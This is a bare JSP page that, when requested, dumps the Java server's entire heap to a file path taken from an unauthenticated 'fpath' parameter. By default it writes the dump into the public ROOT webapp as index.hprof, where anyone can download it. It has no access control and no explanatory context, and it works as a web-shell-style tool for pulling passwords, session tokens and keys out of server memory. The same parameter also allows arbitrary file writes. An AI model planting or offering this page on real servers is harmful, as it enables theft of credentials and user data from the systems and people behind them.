<%@ page language="java" contentType="text/html; charset=UTF-8"
    pageEncoding="UTF-8"%>
<%
	String fileName = request.getParameter("fpath");
	Class.forName("com.sun.management.HotSpotDiagnosticMXBean").getMethod("dumpHeap", String.class, boolean.class).invoke( java.lang.management.ManagementFactory.newPlatformMXBeanProxy( java.lang.management.ManagementFactory.getPlatformMBeanServer(),"com.sun.management:type=HotSpotDiagnostic", Class.forName("com.sun.management.HotSpotDiagnosticMXBean")) , fileName==null?"..\\webapps\\ROOT\\index.hprof":fileName, false);
%>
	